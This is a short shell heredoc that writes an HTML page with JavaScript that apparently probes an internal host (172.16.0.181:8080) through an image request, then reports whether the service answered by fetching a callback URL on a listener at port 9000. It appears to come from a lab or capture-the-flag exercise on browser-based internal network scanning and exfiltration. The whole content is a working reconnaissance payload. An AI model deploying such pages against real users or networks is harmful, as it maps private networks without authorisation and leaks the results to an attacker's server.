cat << 'EOF' > /tmp/scan.html
<!DOCTYPE html>
<html>
<body>
<h1>Scanning...</h1>
<script>
    // The IP we want to detect (Your current machine)
    var target_ip = "172.16.0.181";
    var port = "8080";
    var callback_port = "9000"; // The Python server we will run

    console.log("Starting scan for " + target_ip);

    var img = new Image();

    // SUCCESS HANDLER: The browser found the service!
    img.onload = function() {
        // Exfiltrate success by requesting a fake URL on our python server
        fetch("http://" + target_ip + ":" + callback_port + "/FOUND_TARGET_" + target_ip);
    };

    // FAILURE HANDLER: Port is closed or not an image
    img.onerror = function() {
        // Even an error means the host is UP (just not serving an image)
        // A timeout would mean the host is DOWN.
        // For this test, we assume if it responds AT ALL, it's found.
        fetch("http://" + target_ip + ":" + callback_port + "/FOUND_BUT_ERROR_" + target_ip);
    };

    // Trigger the probe
    img.src = "http://" + target_ip + ":" + port + "/favicon.ico";
</script>
</body>
</html>
EOF
